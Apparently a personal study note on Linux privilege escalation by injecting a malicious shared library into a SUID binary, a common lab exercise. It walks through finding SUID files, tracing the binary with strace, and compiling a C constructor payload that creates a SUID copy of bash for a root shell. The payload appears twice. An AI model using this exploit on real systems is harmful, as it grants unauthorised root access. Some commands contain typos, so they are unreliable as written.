This technique is more advanced. 

The idea is to force a program to charge a malicious `.so` library during the execution in order to execute our code.

The program must:
1. have the `SUID` set 
2. charge libraries dinamically

# Search for vulnerable program 

<mark style="background: #BBFABBA6;">First of all we need to execute:</mark>
```bash
find / -type -f -perm -04000 -ls 2>/dev/null
```
- ![[Pasted image 20250117114218.png]]

In this case we will look at this `suid-so`


If we analyze it we can see:
```bash
ls-la /usr/local/bin/suid-so
```
- ![[Pasted image 20250117114348.png]]


Now we must see what it does:
```bash
/usr/local/bin/suid-so
```
- ![[Pasted image 20250117114433.png]]
- It seems to do nothing but we can use it

# Using strace to understand what it does

We can use `strace` to look at the instruction it executes:
```bash
strace /usr/local/bin/suid-so 2>&1
```

As we can see it accesses to a lot of files:
- ![[Pasted image 20250117114703.png]]


To have a better view we can run:
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
- `-i` makes key insensitive
- `-E` allows regular expressions
- `"open|access|no such file"` searchses for at list of that
- ![[Pasted image 20250117114948.png]]


In our case it is very interesting:
- ![[Pasted image 20250117115024.png]]
- so we try to overwrite it because we can access `/home/user`


# Write injection

We can try to write this code to inject:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```


The part:
- `cp /bin/bash /tmp/bash` copies the bash binary in `/tmp` that is accessible by normal users
- `chmod +s /tmp/bash` sets the `SUID` bit so when it is executed it gets the owner privileges (root here)
- `/tmp/bash -p` runs the bash with the root privilege here


So we create a `.config` folder:
```bash
mkdir /home/user/.config
```


We compile it:
```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.so
```

At this point we run again the initial program:
```bahs
/usr/local/bin/suid-so
```
- ![[Pasted image 20250117120005.png]]

<mark style="background: #BBFABBA6;">And we gain root access!</mark>



- [ ] **List files with the SUID bit set**
- `find / -perm -u=s -type f 2>/dev/null`

- [ ] **Run these files using `strace`**

- [ ] **Look if we are able to inject `.so` files in the running**

- [ ] **Write and compile a `.so` file**
```C
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

- [ ] **Inject the shared library**

- [ ] **Run the bash file created by the injection**

